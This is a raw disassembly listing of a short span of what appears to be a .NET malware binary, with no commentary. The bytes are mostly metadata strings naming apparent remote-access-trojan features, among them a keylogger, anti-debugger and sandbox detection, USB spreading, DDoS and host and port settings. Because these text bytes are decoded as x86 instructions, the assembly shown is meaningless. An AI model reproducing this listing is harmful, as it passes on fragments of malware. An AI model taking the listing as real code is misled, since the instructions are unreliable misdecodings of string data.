  407ba5:	00 4d 79             	add    %cl,0x79(%ebp)
  407ba8:	43                   	inc    %ebx
  407ba9:	6f                   	outsl  %ds:(%esi),(%dx)
  407baa:	6d                   	insl   (%dx),%es:(%edi)
  407bab:	70 75                	jo     0x407c22
  407bad:	74 65                	je     0x407c14
  407baf:	72 00                	jb     0x407bb1
  407bb1:	4d                   	dec    %ebp
  407bb2:	79 50                	jns    0x407c04
  407bb4:	72 6f                	jb     0x407c25
  407bb6:	6a 65                	push   $0x65
  407bb8:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  407bbc:	79 57                	jns    0x407c15
  407bbe:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  407bc2:	72 76                	jb     0x407c3a
  407bc4:	69 63 65 73 00 54 68 	imul   $0x68540073,0x65(%ebx),%esp
  407bcb:	72 65                	jb     0x407c32
  407bcd:	61                   	popa
  407bce:	64 53                	fs push %ebx
  407bd0:	61                   	popa
  407bd1:	66 65 4f             	gs dec %di
  407bd4:	62 6a 65             	bound  %ebp,0x65(%edx)
  407bd7:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  407bdb:	6f                   	outsl  %ds:(%esi),(%dx)
  407bdc:	76 69                	jbe    0x407c47
  407bde:	64 65 72 60          	fs gs jb 0x407c42
  407be2:	31 00                	xor    %eax,(%eax)
  407be4:	53                   	push   %ebx
  407be5:	65 74 74             	gs je  0x407c5c
  407be8:	69 6e 67 73 00 4d 61 	imul   $0x614d0073,0x67(%esi),%ebp
  407bef:	69 6e 00 53 74 75 62 	imul   $0x62757453,0x0(%esi),%ebp
  407bf6:	00 43 6c             	add    %al,0x6c(%ebx)
  407bf9:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  407c00:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  407c04:	4d                   	dec    %ebp
  407c05:	65 73 73             	gs jae 0x407c7b
  407c08:	61                   	popa
  407c09:	67 65 73 00          	addr16 gs jae 0x407c0d
  407c0d:	55                   	push   %ebp
  407c0e:	6e                   	outsb  %ds:(%esi),(%dx)
  407c0f:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  407c16:	65 72 00             	gs jb  0x407c19
  407c19:	58                   	pop    %eax
  407c1a:	4c                   	dec    %esp
  407c1b:	6f                   	outsl  %ds:(%esi),(%dx)
  407c1c:	67 67 65 72 00       	addr16 addr16 gs jb 0x407c21
  407c21:	50                   	push   %eax
  407c22:	72 6f                	jb     0x407c93
  407c24:	63 65 73             	arpl   %esp,0x73(%ebp)
  407c27:	73 43                	jae    0x407c6c
  407c29:	72 69                	jb     0x407c94
  407c2b:	74 69                	je     0x407c96
  407c2d:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407c30:	00 41 6c             	add    %al,0x6c(%ecx)
  407c33:	67 6f                	outsl  %ds:(%si),(%dx)
  407c35:	72 69                	jb     0x407ca0
  407c37:	74 68                	je     0x407ca1
  407c39:	6d                   	insl   (%dx),%es:(%edi)
  407c3a:	41                   	inc    %ecx
  407c3b:	45                   	inc    %ebp
  407c3c:	53                   	push   %ebx
  407c3d:	00 48 65             	add    %cl,0x65(%eax)
  407c40:	6c                   	insb   (%dx),%es:(%edi)
  407c41:	70 65                	jo     0x407ca8
  407c43:	72 00                	jb     0x407c45
  407c45:	4c                   	dec    %esp
  407c46:	6f                   	outsl  %ds:(%esi),(%dx)
  407c47:	77 4c                	ja     0x407c95
  407c49:	65 76 65             	gs jbe 0x407cb1
  407c4c:	6c                   	insb   (%dx),%es:(%edi)
  407c4d:	4b                   	dec    %ebx
  407c4e:	65 79 62             	gs jns 0x407cb3
  407c51:	6f                   	outsl  %ds:(%esi),(%dx)
  407c52:	61                   	popa
  407c53:	72 64                	jb     0x407cb9
  407c55:	50                   	push   %eax
  407c56:	72 6f                	jb     0x407cc7
  407c58:	63 00                	arpl   %eax,(%eax)
  407c5a:	4c                   	dec    %esp
  407c5b:	41                   	inc    %ecx
  407c5c:	53                   	push   %ebx
  407c5d:	54                   	push   %esp
  407c5e:	49                   	dec    %ecx
  407c5f:	4e                   	dec    %esi
  407c60:	50                   	push   %eax
  407c61:	55                   	push   %ebp
  407c62:	54                   	push   %esp
  407c63:	49                   	dec    %ecx
  407c64:	4e                   	dec    %esi
  407c65:	46                   	inc    %esi
  407c66:	4f                   	dec    %edi
  407c67:	00 45 58             	add    %al,0x58(%ebp)
  407c6a:	45                   	inc    %ebp
  407c6b:	43                   	inc    %ebx
  407c6c:	55                   	push   %ebp
  407c6d:	54                   	push   %esp
  407c6e:	49                   	dec    %ecx
  407c6f:	4f                   	dec    %edi
  407c70:	4e                   	dec    %esi
  407c71:	5f                   	pop    %edi
  407c72:	53                   	push   %ebx
  407c73:	54                   	push   %esp
  407c74:	41                   	inc    %ecx
  407c75:	54                   	push   %esp
  407c76:	45                   	inc    %ebp
  407c77:	00 4d 69             	add    %cl,0x69(%ebp)
  407c7a:	63 72 6f             	arpl   %esi,0x6f(%edx)
  407c7d:	73 6f                	jae    0x407cee
  407c7f:	66 74 2e             	data16 je 0x407cb0
  407c82:	56                   	push   %esi
  407c83:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407c8a:	73 69                	jae    0x407cf5
  407c8c:	63 2e                	arpl   %ebp,(%esi)
  407c8e:	41                   	inc    %ecx
  407c8f:	70 70                	jo     0x407d01
  407c91:	6c                   	insb   (%dx),%es:(%edi)
  407c92:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  407c99:	53                   	push   %ebx
  407c9a:	65 72 76             	gs jb  0x407d13
  407c9d:	69 63 65 73 00 41 70 	imul   $0x70410073,0x65(%ebx),%esp
  407ca4:	70 6c                	jo     0x407d12
  407ca6:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  407cad:	42                   	inc    %edx
  407cae:	61                   	popa
  407caf:	73 65                	jae    0x407d16
  407cb1:	00 2e                	add    %ch,(%esi)
  407cb3:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  407cb7:	00 4d 69             	add    %cl,0x69(%ebp)
  407cba:	63 72 6f             	arpl   %esi,0x6f(%edx)
  407cbd:	73 6f                	jae    0x407d2e
  407cbf:	66 74 2e             	data16 je 0x407cf0
  407cc2:	56                   	push   %esi
  407cc3:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407cca:	73 69                	jae    0x407d35
  407ccc:	63 2e                	arpl   %ebp,(%esi)
  407cce:	44                   	inc    %esp
  407ccf:	65 76 69             	gs jbe 0x407d3b
  407cd2:	63 65 73             	arpl   %esp,0x73(%ebp)
  407cd5:	00 43 6f             	add    %al,0x6f(%ebx)
  407cd8:	6d                   	insl   (%dx),%es:(%edi)
  407cd9:	70 75                	jo     0x407d50
  407cdb:	74 65                	je     0x407d42
  407cdd:	72 00                	jb     0x407cdf
  407cdf:	53                   	push   %ebx
  407ce0:	79 73                	jns    0x407d55
  407ce2:	74 65                	je     0x407d49
  407ce4:	6d                   	insl   (%dx),%es:(%edi)
  407ce5:	00 4f 62             	add    %cl,0x62(%edi)
  407ce8:	6a 65                	push   $0x65
  407cea:	63 74 00 2e          	arpl   %esi,0x2e(%eax,%eax,1)
  407cee:	63 63 74             	arpl   %esp,0x74(%ebx)
  407cf1:	6f                   	outsl  %ds:(%esi),(%dx)
  407cf2:	72 00                	jb     0x407cf4
  407cf4:	67 65 74 5f          	addr16 gs je 0x407d57
  407cf8:	43                   	inc    %ebx
  407cf9:	6f                   	outsl  %ds:(%esi),(%dx)
  407cfa:	6d                   	insl   (%dx),%es:(%edi)
  407cfb:	70 75                	jo     0x407d72
  407cfd:	74 65                	je     0x407d64
  407cff:	72 00                	jb     0x407d01
  407d01:	6d                   	insl   (%dx),%es:(%edi)
  407d02:	5f                   	pop    %edi
  407d03:	43                   	inc    %ebx
  407d04:	6f                   	outsl  %ds:(%esi),(%dx)
  407d05:	6d                   	insl   (%dx),%es:(%edi)
  407d06:	70 75                	jo     0x407d7d
  407d08:	74 65                	je     0x407d6f
  407d0a:	72 4f                	jb     0x407d5b
  407d0c:	62 6a 65             	bound  %ebp,0x65(%edx)
  407d0f:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  407d13:	6f                   	outsl  %ds:(%esi),(%dx)
  407d14:	76 69                	jbe    0x407d7f
  407d16:	64 65 72 00          	fs gs jb 0x407d1a
  407d1a:	67 65 74 5f          	addr16 gs je 0x407d7d
  407d1e:	41                   	inc    %ecx
  407d1f:	70 70                	jo     0x407d91
  407d21:	6c                   	insb   (%dx),%es:(%edi)
  407d22:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  407d29:	00 6d 5f             	add    %ch,0x5f(%ebp)
  407d2c:	41                   	inc    %ecx
  407d2d:	70 70                	jo     0x407d9f
  407d2f:	4f                   	dec    %edi
  407d30:	62 6a 65             	bound  %ebp,0x65(%edx)
  407d33:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  407d37:	6f                   	outsl  %ds:(%esi),(%dx)
  407d38:	76 69                	jbe    0x407da3
  407d3a:	64 65 72 00          	fs gs jb 0x407d3e
  407d3e:	55                   	push   %ebp
  407d3f:	73 65                	jae    0x407da6
  407d41:	72 00                	jb     0x407d43
  407d43:	67 65 74 5f          	addr16 gs je 0x407da6
  407d47:	55                   	push   %ebp
  407d48:	73 65                	jae    0x407daf
  407d4a:	72 00                	jb     0x407d4c
  407d4c:	6d                   	insl   (%dx),%es:(%edi)
  407d4d:	5f                   	pop    %edi
  407d4e:	55                   	push   %ebp
  407d4f:	73 65                	jae    0x407db6
  407d51:	72 4f                	jb     0x407da2
  407d53:	62 6a 65             	bound  %ebp,0x65(%edx)
  407d56:	63 74 50 72          	arpl   %esi,0x72(%eax,%edx,2)
  407d5a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d5b:	76 69                	jbe    0x407dc6
  407d5d:	64 65 72 00          	fs gs jb 0x407d61
  407d61:	67 65 74 5f          	addr16 gs je 0x407dc4
  407d65:	57                   	push   %edi
  407d66:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  407d6a:	72 76                	jb     0x407de2
  407d6c:	69 63 65 73 00 6d 5f 	imul   $0x5f6d0073,0x65(%ebx),%esp
  407d73:	4d                   	dec    %ebp
  407d74:	79 57                	jns    0x407dcd
  407d76:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  407d7a:	72 76                	jb     0x407df2
  407d7c:	69 63 65 73 4f 62 6a 	imul   $0x6a624f73,0x65(%ebx),%esp
  407d83:	65 63 74 50 72       	arpl   %esi,%gs:0x72(%eax,%edx,2)
  407d88:	6f                   	outsl  %ds:(%esi),(%dx)
  407d89:	76 69                	jbe    0x407df4
  407d8b:	64 65 72 00          	fs gs jb 0x407d8f
  407d8f:	41                   	inc    %ecx
  407d90:	70 70                	jo     0x407e02
  407d92:	6c                   	insb   (%dx),%es:(%edi)
  407d93:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  407d9a:	00 57 65             	add    %dl,0x65(%edi)
  407d9d:	62 53 65             	bound  %edx,0x65(%ebx)
  407da0:	72 76                	jb     0x407e18
  407da2:	69 63 65 73 00 45 71 	imul   $0x71450073,0x65(%ebx),%esp
  407da9:	75 61                	jne    0x407e0c
  407dab:	6c                   	insb   (%dx),%es:(%edi)
  407dac:	73 00                	jae    0x407dae
  407dae:	6f                   	outsl  %ds:(%esi),(%dx)
  407daf:	00 47 65             	add    %al,0x65(%edi)
  407db2:	74 48                	je     0x407dfc
  407db4:	61                   	popa
  407db5:	73 68                	jae    0x407e1f
  407db7:	43                   	inc    %ebx
  407db8:	6f                   	outsl  %ds:(%esi),(%dx)
  407db9:	64 65 00 54 79 70    	fs add %dl,%gs:0x70(%ecx,%edi,2)
  407dbf:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407dc3:	74 54                	je     0x407e19
  407dc5:	79 70                	jns    0x407e37
  407dc7:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407dcc:	74 72                	je     0x407e40
  407dce:	69 6e 67 00 43 72 65 	imul   $0x65724300,0x67(%esi),%ebp
  407dd5:	61                   	popa
  407dd6:	74 65                	je     0x407e3d
  407dd8:	5f                   	pop    %edi
  407dd9:	5f                   	pop    %edi
  407dda:	49                   	dec    %ecx
  407ddb:	6e                   	outsb  %ds:(%esi),(%dx)
  407ddc:	73 74                	jae    0x407e52
  407dde:	61                   	popa
  407ddf:	6e                   	outsb  %ds:(%esi),(%dx)
  407de0:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  407de3:	5f                   	pop    %edi
  407de4:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  407de8:	6e                   	outsb  %ds:(%esi),(%dx)
  407de9:	73 74                	jae    0x407e5f
  407deb:	61                   	popa
  407dec:	6e                   	outsb  %ds:(%esi),(%dx)
  407ded:	63 65 00             	arpl   %esp,0x0(%ebp)
  407df0:	44                   	inc    %esp
  407df1:	69 73 70 6f 73 65 5f 	imul   $0x5f65736f,0x70(%ebx),%esi
  407df8:	5f                   	pop    %edi
  407df9:	49                   	dec    %ecx
  407dfa:	6e                   	outsb  %ds:(%esi),(%dx)
  407dfb:	73 74                	jae    0x407e71
  407dfd:	61                   	popa
  407dfe:	6e                   	outsb  %ds:(%esi),(%dx)
  407dff:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  407e02:	5f                   	pop    %edi
  407e03:	00 67 65             	add    %ah,0x65(%edi)
  407e06:	74 5f                	je     0x407e67
  407e08:	47                   	inc    %edi
  407e09:	65 74 49             	gs je  0x407e55
  407e0c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e0d:	73 74                	jae    0x407e83
  407e0f:	61                   	popa
  407e10:	6e                   	outsb  %ds:(%esi),(%dx)
  407e11:	63 65 00             	arpl   %esp,0x0(%ebp)
  407e14:	6d                   	insl   (%dx),%es:(%edi)
  407e15:	5f                   	pop    %edi
  407e16:	54                   	push   %esp
  407e17:	68 72 65 61 64       	push   $0x64616572
  407e1c:	53                   	push   %ebx
  407e1d:	74 61                	je     0x407e80
  407e1f:	74 69                	je     0x407e8a
  407e21:	63 56 61             	arpl   %edx,0x61(%esi)
  407e24:	6c                   	insb   (%dx),%es:(%edi)
  407e25:	75 65                	jne    0x407e8c
  407e27:	00 47 65             	add    %al,0x65(%edi)
  407e2a:	74 49                	je     0x407e75
  407e2c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e2d:	73 74                	jae    0x407ea3
  407e2f:	61                   	popa
  407e30:	6e                   	outsb  %ds:(%esi),(%dx)
  407e31:	63 65 00             	arpl   %esp,0x0(%ebp)
  407e34:	48                   	dec    %eax
  407e35:	6f                   	outsl  %ds:(%esi),(%dx)
  407e36:	73 74                	jae    0x407eac
  407e38:	73 00                	jae    0x407e3a
  407e3a:	48                   	dec    %eax
  407e3b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e3c:	73 74                	jae    0x407eb2
  407e3e:	00 50 6f             	add    %dl,0x6f(%eax)
  407e41:	72 74                	jb     0x407eb7
  407e43:	00 4b 45             	add    %cl,0x45(%ebx)
  407e46:	59                   	pop    %ecx
  407e47:	00 53 50             	add    %dl,0x50(%ebx)
  407e4a:	4c                   	dec    %esp
  407e4b:	00 53 6c             	add    %dl,0x6c(%ebx)
  407e4e:	65 65 70 00          	gs gs jo 0x407e52
  407e52:	47                   	inc    %edi
  407e53:	72 6f                	jb     0x407ec4
  407e55:	75 70                	jne    0x407ec7
  407e57:	00 55 53             	add    %dl,0x53(%ebp)
  407e5a:	42                   	inc    %edx
  407e5b:	4e                   	dec    %esi
  407e5c:	4d                   	dec    %ebp
  407e5d:	00 49 6e             	add    %cl,0x6e(%ecx)
  407e60:	73 74                	jae    0x407ed6
  407e62:	61                   	popa
  407e63:	6c                   	insb   (%dx),%es:(%edi)
  407e64:	6c                   	insb   (%dx),%es:(%edi)
  407e65:	44                   	inc    %esp
  407e66:	69 72 00 49 6e 73 74 	imul   $0x74736e49,0x0(%edx),%esi
  407e6d:	61                   	popa
  407e6e:	6c                   	insb   (%dx),%es:(%edi)
  407e6f:	6c                   	insb   (%dx),%es:(%edi)
  407e70:	53                   	push   %ebx
  407e71:	74 72                	je     0x407ee5
  407e73:	00 4d 75             	add    %cl,0x75(%ebp)
  407e76:	74 65                	je     0x407edd
  407e78:	78 00                	js     0x407e7a
  407e7a:	4c                   	dec    %esp
  407e7b:	6f                   	outsl  %ds:(%esi),(%dx)
  407e7c:	67 67 65 72 50       	addr16 addr16 gs jb 0x407ed1
  407e81:	61                   	popa
  407e82:	74 68                	je     0x407eec
  407e84:	00 45 78             	add    %al,0x78(%ebp)
  407e87:	63 6c 75 73          	arpl   %ebp,0x73(%ebp,%esi,2)
  407e8b:	69 6f 6e 00 52 75 6e 	imul   $0x6e755200,0x6e(%edi),%ebp
  407e92:	41                   	inc    %ecx
  407e93:	6e                   	outsb  %ds:(%esi),(%dx)
  407e94:	74 69                	je     0x407eff
  407e96:	41                   	inc    %ecx
  407e97:	6e                   	outsb  %ds:(%esi),(%dx)
  407e98:	61                   	popa
  407e99:	6c                   	insb   (%dx),%es:(%edi)
  407e9a:	79 73                	jns    0x407f0f
  407e9c:	69 73 00 61 6e 79 72 	imul   $0x72796e61,0x0(%ebx),%esi
  407ea3:	75 6e                	jne    0x407f13
  407ea5:	00 49 73             	add    %cl,0x73(%ecx)
  407ea8:	58                   	pop    %eax
  407ea9:	50                   	push   %eax
  407eaa:	00 44 65 74          	add    %al,0x74(%ebp,%eiz,2)
  407eae:	65 63 74 4d 61       	arpl   %esi,%gs:0x61(%ebp,%ecx,2)
  407eb3:	6e                   	outsb  %ds:(%esi),(%dx)
  407eb4:	75 66                	jne    0x407f1c
  407eb6:	61                   	popa
  407eb7:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  407ebb:	65 72 00             	gs jb  0x407ebe
  407ebe:	44                   	inc    %esp
  407ebf:	65 74 65             	gs je  0x407f27
  407ec2:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  407ec6:	62 75 67             	bound  %esi,0x67(%ebp)
  407ec9:	67 65 72 00          	addr16 gs jb 0x407ecd
  407ecd:	44                   	inc    %esp
  407ece:	65 74 65             	gs je  0x407f36
  407ed1:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407ed5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ed6:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407eda:	69 65 00 47 65 74 4d 	imul   $0x4d746547,0x0(%ebp),%esp
  407ee1:	6f                   	outsl  %ds:(%esi),(%dx)
  407ee2:	64 75 6c             	fs jne 0x407f51
  407ee5:	65 48                	gs dec %eax
  407ee7:	61                   	popa
  407ee8:	6e                   	outsb  %ds:(%esi),(%dx)
  407ee9:	64 6c                	fs insb (%dx),%es:(%edi)
  407eeb:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407ef0:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef1:	64 75 6c             	fs jne 0x407f60
  407ef4:	65 4e                	gs dec %esi
  407ef6:	61                   	popa
  407ef7:	6d                   	insl   (%dx),%es:(%edi)
  407ef8:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407efc:	65 63 6b 52          	arpl   %ebp,%gs:0x52(%ebx)
  407f00:	65 6d                	gs insl (%dx),%es:(%edi)
  407f02:	6f                   	outsl  %ds:(%esi),(%dx)
  407f03:	74 65                	je     0x407f6a
  407f05:	44                   	inc    %esp
  407f06:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407f0a:	67 65 72 50          	addr16 gs jb 0x407f5e
  407f0e:	72 65                	jb     0x407f75
  407f10:	73 65                	jae    0x407f77
  407f12:	6e                   	outsb  %ds:(%esi),(%dx)
  407f13:	74 00                	je     0x407f15
  407f15:	68 50 72 6f 63       	push   $0x636f7250
  407f1a:	65 73 73             	gs jae 0x407f90
  407f1d:	00 69 73             	add    %ch,0x73(%ecx)
  407f20:	44                   	inc    %esp
  407f21:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407f25:	67 65 72 50          	addr16 gs jb 0x407f79
  407f29:	72 65                	jb     0x407f90
  407f2b:	73 65                	jae    0x407f92
  407f2d:	6e                   	outsb  %ds:(%esi),(%dx)
  407f2e:	74 00                	je     0x407f30
  407f30:	69 73 43 6f 6e 6e 65 	imul   $0x656e6e6f,0x43(%ebx),%esi
  407f37:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  407f3b:	00 53 79             	add    %dl,0x79(%ebx)
  407f3e:	73 74                	jae    0x407fb4
  407f40:	65 6d                	gs insl (%dx),%es:(%edi)
  407f42:	2e 4e                	cs dec %esi
  407f44:	65 74 2e             	gs je  0x407f75
  407f47:	53                   	push   %ebx
  407f48:	6f                   	outsl  %ds:(%esi),(%dx)
  407f49:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407f4c:	74 73                	je     0x407fc1
  407f4e:	00 53 6f             	add    %dl,0x6f(%ebx)
  407f51:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  407f54:	74 00                	je     0x407f56
  407f56:	53                   	push   %ebx
  407f57:	00 42 75             	add    %al,0x75(%edx)
  407f5a:	66 66 65 72 4c       	data16 data16 gs jb 0x407fab
  407f5f:	65 6e                	outsb  %gs:(%esi),(%dx)
  407f61:	67 74 68             	addr16 je 0x407fcc
  407f64:	00 42 75             	add    %al,0x75(%edx)
  407f67:	66 66 65 72 00       	data16 data16 gs jb 0x407f6c
  407f6c:	53                   	push   %ebx
  407f6d:	79 73                	jns    0x407fe2
  407f6f:	74 65                	je     0x407fd6
  407f71:	6d                   	insl   (%dx),%es:(%edi)
  407f72:	2e 49                	cs dec %ecx
  407f74:	4f                   	dec    %edi
  407f75:	00 4d 65             	add    %cl,0x65(%ebp)
  407f78:	6d                   	insl   (%dx),%es:(%edi)
  407f79:	6f                   	outsl  %ds:(%esi),(%dx)
  407f7a:	72 79                	jb     0x407ff5
  407f7c:	53                   	push   %ebx
  407f7d:	74 72                	je     0x407ff1
  407f7f:	65 61                	gs popa
  407f81:	6d                   	insl   (%dx),%es:(%edi)
  407f82:	00 4d 53             	add    %cl,0x53(%ebp)
  407f85:	00 53 79             	add    %dl,0x79(%ebx)
  407f88:	73 74                	jae    0x407ffe
  407f8a:	65 6d                	gs insl (%dx),%es:(%edi)
  407f8c:	2e 54                	cs push %esp
  407f8e:	68 72 65 61 64       	push   $0x64616572
  407f93:	69 6e 67 00 54 69 6d 	imul   $0x6d695400,0x67(%esi),%ebp
  407f9a:	65 72 00             	gs jb  0x407f9d
  407f9d:	54                   	push   %esp
  407f9e:	69 63 6b 00 4d 61 6e 	imul   $0x6e614d00,0x6b(%ebx),%esp
  407fa5:	75 61                	jne    0x408008
  407fa7:	6c                   	insb   (%dx),%es:(%edi)
  407fa8:	52                   	push   %edx
  407fa9:	65 73 65             	gs jae 0x408011
  407fac:	74 45                	je     0x407ff3
  407fae:	76 65                	jbe    0x408015
  407fb0:	6e                   	outsb  %ds:(%esi),(%dx)
  407fb1:	74 00                	je     0x407fb3
  407fb3:	61                   	popa
  407fb4:	6c                   	insb   (%dx),%es:(%edi)
  407fb5:	6c                   	insb   (%dx),%es:(%edi)
  407fb6:	44                   	inc    %esp
  407fb7:	6f                   	outsl  %ds:(%esi),(%dx)
  407fb8:	6e                   	outsb  %ds:(%esi),(%dx)
  407fb9:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407fbd:	6e                   	outsb  %ds:(%esi),(%dx)
  407fbe:	64 53                	fs push %ebx
  407fc0:	79 6e                	jns    0x408030
  407fc2:	63 00                	arpl   %eax,(%eax)
  407fc4:	53                   	push   %ebx
  407fc5:	70 65                	jo     0x40802c
  407fc7:	65 64 00 49 6e       	gs add %cl,%fs:0x6e(%ecx)
  407fcc:	74 65                	je     0x408033
  407fce:	72 76                	jb     0x408046
  407fd0:	61                   	popa
  407fd1:	6c                   	insb   (%dx),%es:(%edi)
  407fd2:	00 41 63             	add    %al,0x63(%ecx)
  407fd5:	74 69                	je     0x408040
  407fd7:	76 61                	jbe    0x40803a
  407fd9:	74 65                	je     0x408040
  407fdb:	50                   	push   %eax
  407fdc:	6f                   	outsl  %ds:(%esi),(%dx)
  407fdd:	6e                   	outsb  %ds:(%esi),(%dx)
  407fde:	67 00 42 65          	add    %al,0x65(%bp,%si)
  407fe2:	67 69 6e 43 6f 6e 6e 	imul   $0x656e6e6f,0x43(%bp),%ebp
  407fe9:	65 
  407fea:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  407fee:	6f                   	outsl  %ds:(%esi),(%dx)
  407fef:	6e                   	outsb  %ds:(%esi),(%dx)
  407ff0:	6e                   	outsb  %ds:(%esi),(%dx)
  407ff1:	65 63 74 53 65       	arpl   %esi,%gs:0x65(%ebx,%edx,2)
  407ff6:	72 76                	jb     0x40806e
  407ff8:	65 72 00             	gs jb  0x407ffb
  407ffb:	48                   	dec    %eax
  407ffc:	00 49 6e             	add    %cl,0x6e(%ecx)
  407fff:	66 6f                	outsw  %ds:(%esi),(%dx)
  408001:	00 49 4e             	add    %cl,0x4e(%ecx)
  408004:	44                   	inc    %esp
  408005:	41                   	inc    %ecx
  408006:	54                   	push   %esp
  408007:	45                   	inc    %ebp
  408008:	00 53 70             	add    %dl,0x70(%ebx)
  40800b:	72 65                	jb     0x408072
  40800d:	61                   	popa
  40800e:	64 00 55 41          	add    %dl,%fs:0x41(%ebp)
  408012:	43                   	inc    %ebx
  408013:	00 41 6e             	add    %al,0x6e(%ecx)
  408016:	74 69                	je     0x408081
  408018:	76 69                	jbe    0x408083
  40801a:	72 75                	jb     0x408091
  40801c:	73 00                	jae    0x40801e
  40801e:	47                   	inc    %edi
  40801f:	50                   	push   %eax
  408020:	55                   	push   %ebp
  408021:	00 43 50             	add    %al,0x50(%ebx)
  408024:	55                   	push   %ebp
  408025:	00 52 41             	add    %dl,0x41(%edx)
  408028:	4d                   	dec    %ebp
  408029:	00 49 41             	add    %cl,0x41(%ecx)
  40802c:	73 79                	jae    0x4080a7
  40802e:	6e                   	outsb  %ds:(%esi),(%dx)
  40802f:	63 52 65             	arpl   %edx,0x65(%edx)
  408032:	73 75                	jae    0x4080a9
  408034:	6c                   	insb   (%dx),%es:(%edi)
  408035:	74 00                	je     0x408037
  408037:	42                   	inc    %edx
  408038:	65 67 69 6e 52 65 63 	imul   $0x69656365,%gs:0x52(%bp),%ebp
  40803f:	65 69 
  408041:	76 65                	jbe    0x4080a8
  408043:	00 61 72             	add    %ah,0x72(%ecx)
  408046:	00 42 65             	add    %al,0x65(%edx)
  408049:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  408050:	00 
  408051:	62 00                	bound  %eax,(%eax)
  408053:	53                   	push   %ebx
  408054:	65 6e                	outsb  %gs:(%esi),(%dx)
  408056:	64 00 6d 73          	add    %ch,%fs:0x73(%ebp)
  40805a:	67 00 45 6e          	add    %al,0x6e(%di)
  40805e:	64 53                	fs push %ebx
  408060:	65 6e                	outsb  %gs:(%esi),(%dx)
  408062:	64 00 69 73          	add    %ch,%fs:0x73(%ecx)
  408066:	44                   	inc    %esp
  408067:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  40806e:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  408072:	00 50 6f             	add    %dl,0x6f(%eax)
  408075:	6e                   	outsb  %ds:(%esi),(%dx)
  408076:	67 00 6f 62          	add    %ch,0x62(%bx)
  40807a:	6a 00                	push   $0x0
  40807c:	50                   	push   %eax
  40807d:	69 6e 67 00 50 61 63 	imul   $0x63615000,0x67(%esi),%ebp
  408084:	6b 00 52             	imul   $0x52,(%eax),%eax
  408087:	65 61                	gs popa
  408089:	64 00 52 53          	add    %dl,%fs:0x53(%edx)
  40808d:	00 50 6c             	add    %dl,0x6c(%eax)
  408090:	75 67                	jne    0x4080f9
  408092:	69 6e 00 42 00 53 65 	imul   $0x65530042,0x0(%esi),%ebp
  408099:	6e                   	outsb  %ds:(%esi),(%dx)
  40809a:	64 4d                	fs dec %ebp
  40809c:	53                   	push   %ebx
  40809d:	47                   	inc    %edi
  40809e:	00 53 65             	add    %dl,0x65(%ebx)
  4080a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4080a2:	64 45                	fs inc %ebp
  4080a4:	72 72                	jb     0x408118
  4080a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4080a7:	72 00                	jb     0x4080a9
  4080a9:	54                   	push   %esp
  4080aa:	68 72 65 61 64       	push   $0x64616572
  4080af:	00 44 44 6f          	add    %al,0x6f(%esp,%eax,2)
  4080b3:	73 00                	jae    0x4080b5
  4080b5:	52                   	push   %edx
  4080b6:	65 70 6f             	gs jo  0x408128
  4080b9:	72 74                	jb     0x40812f
  4080bb:	57                   	push   %edi
  4080bc:	69 6e 64 6f 77 00 54 	imul   $0x5400776f,0x64(%esi),%ebp
  4080c3:	44                   	inc    %esp
  4080c4:	00 49 6e             	add    %cl,0x6e(%ecx)
  4080c7:	70 75                	jo     0x40813e
  4080c9:	74 00                	je     0x4080cb
  4080cb:	4d                   	dec    %ebp
  4080cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4080cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4080ce:	69 74 6f 72 69 6e 67 	imul   $0x676e69,0x72(%edi,%ebp,2),%esi
  4080d5:	00 
  4080d6:	44                   	inc    %esp
